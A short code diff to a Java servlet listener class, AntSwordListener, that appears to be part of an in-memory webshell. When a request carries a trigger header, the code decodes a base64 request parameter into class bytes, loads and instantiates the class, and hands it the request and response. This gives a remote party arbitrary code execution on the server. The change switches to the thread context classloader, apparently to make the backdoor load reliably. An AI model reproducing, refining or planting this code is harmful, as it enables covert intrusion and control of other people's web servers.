@@ -58,7 +58,7 @@ public class AntSwordListener extends ClassLoader implements ServletRequestListe
                     && request.getHeader(headerName).contains(headerValue)) {
                 HttpServletResponse response = getResponseFromRequest(request);
                 byte[] bytes = base64Decode(request.getParameter(pass));
-                Object instance = (new AntSwordListener(this.getClass().getClassLoader())).g(bytes).newInstance();
+                Object instance = (new AntSwordListener(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                 instance.equals(new Object[]{request, response});
             }
         } catch (Exception ignored) {
